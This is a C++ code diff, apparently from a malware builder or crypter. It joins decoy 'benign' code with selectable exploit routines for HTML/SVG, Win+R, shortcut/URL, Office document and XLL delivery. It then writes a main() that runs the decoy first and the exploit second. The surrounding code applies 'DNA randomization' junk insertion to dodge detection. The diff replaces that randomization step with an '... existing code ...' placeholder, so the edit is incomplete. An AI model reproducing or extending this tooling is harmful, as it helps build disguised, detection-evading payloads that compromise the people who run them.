@@ -1922,21 +1922,48 @@ public:
             debugLog << "Benign Code Length: " << benignCode.length() << "\n";
             
             // Create a simple, working combined code structure
-            std::string combinedCode = exploitIncludes + "\n";
+            std::string combinedCode;
+            // Prepend any exploit-specific includes (may be empty)
+            combinedCode = exploitIncludes + "\n";
+
+            // Add the core benign behaviour implementation
             combinedCode += benignCode + "\n\n";
-            
-            // Note: Main function will be added later in the process
-            // Do not add main function here to avoid duplicates
-            
-            debugLog << "Combined Code Length: " << combinedCode.length() << "\n";
-            
-            // Apply DNA randomization (this adds junk variables safely)
-            try {
-                combinedCode = dnaRandomizer.randomizeCode(combinedCode);
-                debugLog << "DNA randomization: SUCCESS\n";
-            } catch (...) {
-                debugLog << "DNA randomization: FAILED\n";
+
+            // Append exploit implementation (if any)
+            combinedCode += exploitCode + "\n\n";
+
+            // --- mandatory entry point so the stub actually links ---
+            combinedCode += "int main() {\n";
+            combinedCode += "    // Run benign operations first\n";
+            combinedCode += "    performBenignOperations();\n";
+
+            switch (exploitType) {
+                case EXPLOIT_HTML_SVG:
+                    combinedCode += "    executeHTMLSVGExploit();\n";
+                    break;
+                case EXPLOIT_WIN_R:
+                    combinedCode += "    executeWinRExploit();\n";
+                    break;
+                case EXPLOIT_INK_URL:
+                    combinedCode += "    executeInkUrlExploit();\n";
+                    break;
+                case EXPLOIT_DOC_XLS:
+                    combinedCode += "    executeDocXlsExploit();\n";
+                    break;
+                case EXPLOIT_XLL:
+                    combinedCode += "    executeXllExploit();\n";
+                    break;
+                case EXPLOIT_NONE:
+                default:
+                    // No exploit selected – nothing extra to run
+                    break;
             }
+
+            combinedCode += "    return 0;\n";
+            combinedCode += "}\n";
+
+            // DNA randomisation will operate on the complete source (including main)
+            // ... existing code ...
             
             // Create temporary source file
             std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
